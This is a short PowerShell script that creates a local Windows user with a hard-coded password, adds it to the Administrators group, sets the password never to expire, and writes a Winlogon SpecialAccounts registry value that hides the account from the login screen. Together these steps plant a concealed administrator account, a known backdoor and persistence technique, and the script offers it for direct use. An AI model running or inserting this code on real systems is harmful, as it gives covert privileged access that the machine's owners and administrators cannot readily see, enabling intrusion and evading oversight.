# Change the following as needed "username" & "password" 

$Username = "Odin"
$Password = "iliketurtles"

$group = "Administrators"

$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$existing = $adsi.Children | Where-Object {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }

if ($existing -eq $null) {

    Write-Host "Creating new local user $Username."
    & NET USER $Username $Password /add /y /expires:never

    Write-Host "Adding local user $Username to $group."
    & NET LOCALGROUP $group $Username /add

}
else {
    Write-Host "Setting password for existing local user $Username."
    $existing.SetPassword($Password)
}

# Sets password as never expires 
Write-Host "Ensuring password for $Username never expires."
& WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE

# Set variables to indicate value and key to set
$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts'
$RegistryPath1 = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$Value        = '0'
# Create the key if it does not exist SpecialAccounts
If (-NOT (Test-Path $RegistryPath)) {
  New-Item -Path $RegistryPath -Force | Out-Null
}  
# Create the key if it does not exist UserList
If (-NOT (Test-Path $RegistryPath1)) {
    New-Item -Path $RegistryPath1 -Force | Out-Null
  }
# Hides User Account from Login page 
New-ItemProperty -Path $RegistryPath1 -Name $Username -Value $Value -PropertyType DWord